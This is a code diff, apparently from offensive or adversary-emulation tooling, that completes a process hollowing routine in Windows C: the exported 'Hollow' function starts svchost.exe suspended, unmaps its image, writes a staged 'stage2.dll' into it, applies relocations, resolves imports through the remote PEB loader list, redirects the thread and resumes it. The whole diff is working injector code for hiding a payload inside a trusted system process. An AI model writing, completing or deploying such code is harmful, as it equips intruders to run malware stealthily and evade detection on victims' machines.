@@ -53,14 +53,187 @@ static DWORD FindSvchostPID(void) {
     return pid;
 }
 
-__declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow) {
-    LogMessage(L"[*] Hollow() started");
+// Apply PE relocations from the .reloc section to the remote process.
+// delta = remoteImage - targetBase. Required when the image is loaded at a
+// different base than its preferred one. Skips if the .reloc section is empty
+// (image must then be loaded at the preferred base).
+static BOOL ApplyRelocations(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, DWORD_PTR delta) {
+    PIMAGE_DATA_DIRECTORY relocDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir->Size == 0) return TRUE;
 
-    // Find svchost.exe path
+    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localBuf + relocDir->VirtualAddress);
+    DWORD offset = 0;
+    while (offset < relocDir->Size) {
+        if (reloc->SizeOfBlock == 0) break;
+        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+        WORD* list = (WORD*)(reloc + 1);
+        for (DWORD i = 0; i < count; i++) {
+            int type = list[i] >> 12;
+            int relOff = list[i] & 0xFFF;
+            LPVOID patchAddr = (LPBYTE)remoteImage + reloc->VirtualAddress + relOff;
+            if (type == IMAGE_REL_BASED_DIR64) {
+                DWORD_PTR val = 0;
+                if (!ReadProcessMemory(hProc, patchAddr, &val, sizeof(val), NULL)) return FALSE;
+                val += delta;
+                if (!WriteProcessMemory(hProc, patchAddr, &val, sizeof(val), NULL)) return FALSE;
+            }
+            // IMAGE_REL_BASED_HIGHLOW is x86-only; on x64 we only see DIR64.
+        }
+        offset += reloc->SizeOfBlock;
+        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
+    }
+    return TRUE;
+}
+
+// Find a DLL's base in the remote process by walking PEB->Ldr->InMemoryOrderModuleList.
+// PEB.Ldr is at offset 0x18 on x64; PEB_LDR_DATA.InMemoryOrderModuleList head is
+// at offset 0x20. LDR_DATA_TABLE_ENTRY layout on x64:
+//   0x00 InLoadOrderLinks  0x10 InMemoryOrderLinks  0x20 InInitializationOrderLinks
+//   0x30 DllBase  0x38 EntryPoint  0x40 SizeOfImage  0x48 FullDllName  0x58 BaseDllName
+// InMemoryOrderLinks.LDR offsets: Length 0x58, MaxLength 0x5A, Buffer 0x60.
+static LPVOID FindRemoteDllBase(HANDLE hProc, LPVOID remotePeb, const wchar_t* dllName) {
+    LPVOID ldrAddr = NULL;
+    if (!ReadProcessMemory(hProc, (LPBYTE)remotePeb + 0x18, &ldrAddr, sizeof(ldrAddr), NULL) || !ldrAddr) return NULL;
+
+    LPVOID head = (LPBYTE)ldrAddr + 0x20;
+    LPVOID entryLE = NULL;
+    if (!ReadProcessMemory(hProc, head, &entryLE, sizeof(entryLE), NULL)) return NULL;
+
+    int maxIter = 512;
+    while (entryLE != head && maxIter-- > 0) {
+        LPBYTE ldrEntry = (LPBYTE)entryLE - 0x10;
+
+        LPVOID dllBase = NULL;
+        USHORT nameLen = 0;
+        PWSTR nameBuf = NULL;
+        ReadProcessMemory(hProc, ldrEntry + 0x30, &dllBase, sizeof(dllBase), NULL);
+        ReadProcessMemory(hProc, ldrEntry + 0x58, &nameLen, sizeof(nameLen), NULL);
+        ReadProcessMemory(hProc, ldrEntry + 0x60, &nameBuf, sizeof(nameBuf), NULL);
+
+        if (nameBuf && nameLen > 0 && nameLen < 512) {
+            wchar_t name[256];
+            ReadProcessMemory(hProc, nameBuf, name, nameLen, NULL);
+            name[nameLen / sizeof(wchar_t)] = 0;
+            if (_wcsicmp(name, dllName) == 0) return dllBase;
+        }
+
+        if (!ReadProcessMemory(hProc, entryLE, &entryLE, sizeof(entryLE), NULL)) return NULL;
+    }
+    return NULL;
+}
+
+// Find an exported function by name in a remote DLL.
+// Returns NULL if the export is forwarded (a known limitation — forwarded
+// exports need the forwarder DLL to be loaded and re-resolved, not in scope).
+static LPVOID FindExportByName(HANDLE hProc, LPVOID dllBase, const char* funcName) {
+    IMAGE_DOS_HEADER dosH;
+    if (!ReadProcessMemory(hProc, dllBase, &dosH, sizeof(dosH), NULL)) return NULL;
+    if (dosH.e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    IMAGE_NT_HEADERS ntH;
+    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + dosH.e_lfanew, &ntH, sizeof(ntH), NULL)) return NULL;
+    if (ntH.Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    IMAGE_DATA_DIRECTORY exportDir = ntH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (exportDir.Size == 0) return NULL;
+
+    IMAGE_EXPORT_DIRECTORY expDir;
+    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + exportDir.VirtualAddress, &expDir, sizeof(expDir), NULL)) return NULL;
+    if (expDir.NumberOfNames == 0 || expDir.NumberOfFunctions == 0) return NULL;
+
+    DWORD nNames = expDir.NumberOfNames;
+    DWORD nFuncs = expDir.NumberOfFunctions;
+
+    DWORD* names = (DWORD*)LocalAlloc(LPTR, nNames * sizeof(DWORD));
+    WORD* ordinals = (WORD*)LocalAlloc(LPTR, nNames * sizeof(WORD));
+    DWORD* funcs = (DWORD*)LocalAlloc(LPTR, nFuncs * sizeof(DWORD));
+    if (!names || !ordinals || !funcs) {
+        if (names) LocalFree(names);
+        if (ordinals) LocalFree(ordinals);
+        if (funcs) LocalFree(funcs);
+        return NULL;
+    }
+
+    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNames, names, nNames * sizeof(DWORD), NULL);
+    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNameOrdinals, ordinals, nNames * sizeof(WORD), NULL);
+    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfFunctions, funcs, nFuncs * sizeof(DWORD), NULL);
+
+    LPVOID result = NULL;
+    for (DWORD i = 0; i < nNames; i++) {
+        char nameBuf[256] = {0};
+        ReadProcessMemory(hProc, (LPBYTE)dllBase + names[i], nameBuf, sizeof(nameBuf) - 1, NULL);
+        nameBuf[sizeof(nameBuf) - 1] = 0;
+        if (lstrcmpA(nameBuf, funcName) == 0) {
+            WORD ord = ordinals[i];
+            if (ord < nFuncs) {
+                DWORD funcRva = funcs[ord];
+                if (funcRva >= exportDir.VirtualAddress && funcRva < exportDir.VirtualAddress + exportDir.Size) {
+                    break;  // forwarded — bail
+                }
+                result = (LPBYTE)dllBase + funcRva;
+            }
+            break;
+        }
+    }
+
+    LocalFree(names);
+    LocalFree(ordinals);
+    LocalFree(funcs);
+    return result;
+}
+
+// Walk stage2's import table. For each DLL referenced, find the matching
+// remote DLL base (must already be loaded in the target process) and resolve
+// every imported function by name, writing the address to the remote IAT.
+// Ordinal imports are flagged and rejected (not used in this scenario).
+static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, LPVOID remotePeb) {
+    PIMAGE_DATA_DIRECTORY importDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir->Size == 0) return TRUE;
+
+    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(localBuf + importDir->VirtualAddress);
+    for (; import->Name; import++) {
+        const char* dllNameA = (const char*)(localBuf + import->Name);
+        wchar_t dllName[256];
+        MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllName, 256);
+
+        LPVOID remoteDllBase = FindRemoteDllBase(hProc, remotePeb, dllName);
+        if (!remoteDllBase) {
+            wchar_t buf[256];
+            wsprintfW(buf, L"[-] IAT: DLL not in remote process: %s", dllName);
+            LogMessage(buf);
+            return FALSE;
+        }
+
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + import->OriginalFirstThunk);
+        LPBYTE remoteIat = (LPBYTE)remoteImage + import->FirstThunk;
+        for (; thunk->u1.AddressOfData; thunk++, remoteIat += sizeof(PVOID)) {
+            LPVOID funcAddr = NULL;
+            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
+                wchar_t buf[256];
+                wsprintfW(buf, L"[-] IAT: ordinal import not supported: %s!%lu", dllName, (thunk->u1.Ordinal & 0xFFFF));
+                LogMessage(buf);
+                return FALSE;
+            }
+            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(localBuf + thunk->u1.AddressOfData);
+            funcAddr = FindExportByName(hProc, remoteDllBase, (const char*)ibn->Name);
+            if (!funcAddr) {
+                wchar_t buf[256];
+                wsprintfW(buf, L"[-] IAT: export not found: %s!%s", dllName, ibn->Name);
+                LogMessage(buf);
+                return FALSE;
+            }
+            if (!WriteProcessMemory(hProc, remoteIat, &funcAddr, sizeof(PVOID), NULL)) return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+__declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow) {
+    LogMessage(L"[*] Hollow() started — T1055.012 process hollowing");
+
     wchar_t svchostPath[MAX_PATH] = {0};
     DWORD pid = FindSvchostPID();
     if (!pid) {
-        LogMessage(L"[-] svchost.exe not found — using default path");
         lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
     } else {
         HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
@@ -72,7 +245,6 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
             lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
     }
 
-    // Create suspended svchost
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {0};
     if (!CreateProcessW(svchostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
@@ -81,24 +253,17 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
     LogMessage(L"[+] svchost.exe created suspended");
 
-    // NtUnmapViewOfSection
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     PNtUnmapViewOfSection pNtUnmap = (PNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
-    if (!pNtUnmap) {
-        LogMessage(L"[-] NtUnmapViewOfSection not found");
+    NTSTATUS (NTAPI *pNtQueryInfo)(HANDLE, int, PVOID, ULONG, PULONG) =
+        (void*)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    if (!pNtUnmap || !pNtQueryInfo) {
+        LogMessage(L"[-] ntdll function not found");
         TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
         return;
     }
 
-    // Read PEB to get image base
     PROCESS_BASIC_INFORMATION pbi = {0};
-    NTSTATUS (NTAPI *pNtQueryInfo)(HANDLE, int, PVOID, ULONG, PULONG) =
-        (void*)GetProcAddress(hNtdll, "NtQueryInformationProcess");
-    if (!pNtQueryInfo) {
-        LogMessage(L"[-] NtQueryInformationProcess not found");
-        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
-        return;
-    }
     ULONG retLen = 0;
     if (pNtQueryInfo(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen) != 0) {
         LogMessage(L"[-] NtQueryInformationProcess failed");
@@ -106,7 +271,6 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
         return;
     }
 
-    // Read PEB -> ImageBaseAddress
     BYTE pebBuf[sizeof(PVOID) * 4] = {0};
     if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, pebBuf, sizeof(PVOID), NULL)) {
         LogMessage(L"[-] ReadProcessMemory PEB failed");
@@ -116,7 +280,6 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     LPVOID imageBase;
     memcpy(&imageBase, pebBuf, sizeof(PVOID));
 
-    // Read stage2.dll from disk
     HANDLE hFile = CreateFileW(STAGE2_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         LogMessage(L"[-] stage2.dll not found at staging path");
@@ -126,23 +289,20 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     DWORD fileSize = GetFileSize(hFile, NULL);
     LPBYTE stage2Buf = (LPBYTE)LocalAlloc(LPTR, fileSize);
     if (!stage2Buf) { CloseHandle(hFile); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
-    DWORD read = 0;
-    ReadFile(hFile, stage2Buf, fileSize, &read, NULL);
+    DWORD readBytes = 0;
+    ReadFile(hFile, stage2Buf, fileSize, &readBytes, NULL);
     CloseHandle(hFile);
 
-    // Parse PE headers
     PIMAGE_DOS_HEADER dosH = (PIMAGE_DOS_HEADER)stage2Buf;
     PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(stage2Buf + dosH->e_lfanew);
     DWORD imageSize = ntH->OptionalHeader.SizeOfImage;
     LPVOID targetBase = (LPVOID)ntH->OptionalHeader.ImageBase;
 
-    // Unmap original svchost
     pNtUnmap(pi.hProcess, imageBase);
 
-    // Allocate memory in svchost
     LPVOID remoteImage = VirtualAllocEx(pi.hProcess, targetBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteImage) {
-        LogMessage(L"[-] VirtualAllocEx failed — trying any address");
+        LogMessage(L"[-] VirtualAllocEx at preferred base failed — trying any address");
         remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!remoteImage) {
             LogMessage(L"[-] VirtualAllocEx (any addr) also failed");
@@ -151,10 +311,7 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
         }
     }
 
-    // Write PE headers
     WriteProcessMemory(pi.hProcess, remoteImage, stage2Buf, ntH->OptionalHeader.SizeOfHeaders, NULL);
-
-    // Write each section
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntH);
     for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
         if (section[i].SizeOfRawData) {
@@ -164,12 +321,27 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
     LogMessage(L"[+] stage2.dll written to svchost memory");
 
-    // Fix up image base address in PEB if we allocated at a different address
+    DWORD_PTR delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
+    if (delta != 0) {
+        if (!ApplyRelocations(pi.hProcess, remoteImage, ntH, stage2Buf, delta)) {
+            LogMessage(L"[-] ApplyRelocations failed");
+            LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+            return;
+        }
+        LogMessage(L"[+] Relocations applied (delta != 0)");
+    }
+
     if (remoteImage != targetBase) {
         WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, &remoteImage, sizeof(PVOID), NULL);
     }
 
-    // Set thread context to entry point
+    if (!ResolveImports(pi.hProcess, remoteImage, ntH, stage2Buf, pbi.PebBaseAddress)) {
+        LogMessage(L"[-] IAT resolution failed");
+        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        return;
+    }
+    LogMessage(L"[+] IAT resolved");
+
     CONTEXT ctx = { CONTEXT_FULL };
     if (!GetThreadContext(pi.hThread, &ctx)) {
         LogMessage(L"[-] GetThreadContext failed");
@@ -184,7 +356,6 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
     LogMessage(L"[+] Thread context set — entry point redirected");
 
-    // Resume
     ResumeThread(pi.hThread);
     LogMessage(L"[+] Hollow() complete — svchost.exe running stage2");
 
